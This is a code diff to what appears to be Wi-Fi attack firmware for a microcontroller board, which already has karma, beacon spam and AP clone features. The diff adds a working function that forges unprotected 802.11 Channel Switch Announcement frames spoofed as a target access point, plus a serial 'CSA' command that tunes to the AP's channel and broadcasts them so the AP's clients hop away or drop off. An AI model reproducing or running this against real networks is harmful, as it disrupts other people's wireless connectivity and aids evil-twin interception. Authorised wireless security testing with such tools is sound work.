@@ -916,6 +916,31 @@ static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
   }
 }
 
+// --- B2: CSA (channel switch announcement) spoofing ---------------------------
+// An unprotected Spectrum Management action frame telling the clients of <bssid> to move to
+// <newch>: they leave the AP without any deauth. Clients that require protected CSA (PMF/WPA3)
+// ignore it - that is the known limitation, not a bug. The board must transmit on the AP's own
+// channel, so the caller tunes it first.
+static void csa_send_frame(const uint8_t* bssid, uint8_t newch, uint8_t count, uint8_t mode, const uint8_t* dst) {
+  uint8_t f[64];
+  int n = 0;
+  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
+  f[n++] = 0x00; f[n++] = 0x00;              // duration
+  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
+  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
+  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
+  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
+  f[n++] = 0x00;                             // category: spectrum management
+  f[n++] = 0x04;                             // action: channel switch announcement
+  f[n++] = 0x25; f[n++] = 0x03;              // CSA information element
+  f[n++] = mode;                             // 0 = stop on the old channel, 1 = both channels
+  f[n++] = newch;
+  f[n++] = count;
+  memset(tx_stage, 0, n);
+  memcpy(tx_stage, f, n);
+  wifi_tx_raw_frame(tx_stage, n);
+}
+
 static void karma_respond(const char* ssid, const uint8_t* client, int chan) {
   uint8_t bssid[6];
   uint32_t h = 2166136261u;               // FNV-1a -> stable BSSID per SSID
@@ -2000,6 +2025,38 @@ void loop() {
       for(int i=0;i<cnt;i++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), (uint8_t)ftype, chan);
       String r = "TXBEACON:" + String(ftype, HEX) + ":" + String((unsigned)cnt);
       Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,3)=="CSA" && readString.charAt(3)==' '){
+      // B2: CSA <bssid-12hex> <ap-chan> <new-chan> [frames]
+      // Spoofs channel-switch announcements from the target AP; its clients hop channels (or drop)
+      // with no deauth at all. Unprotected-CSA-only: PMF/WPA3 clients ignore it.
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
+      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        Serial.println("ERROR: CSA needs a 12-hex bssid"); Serial1.println("ERROR: CSA needs a 12-hex bssid");
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(newch < 1 || newch > 165) newch = 1;
+        if(frames < 1 || frames > 60) frames = 12;
+        if(apActive) destroyAP();                  // no softAP fighting us on another channel
+        wext_set_channel(WLAN0_NAME, apch);        // we must transmit on the target AP's channel
+        for(int i = 0; i < frames; i++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, TX_BCAST);
+        String r = String("CSA:") + String((unsigned)frames) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
     }else if(readString.substring(0,7)=="APCLONE"){
       // B6: clone <ssid> across [cnt] random locally-administered BSSIDs on [chan] (AP clone spam).
       int s1 = readString.indexOf(' ');
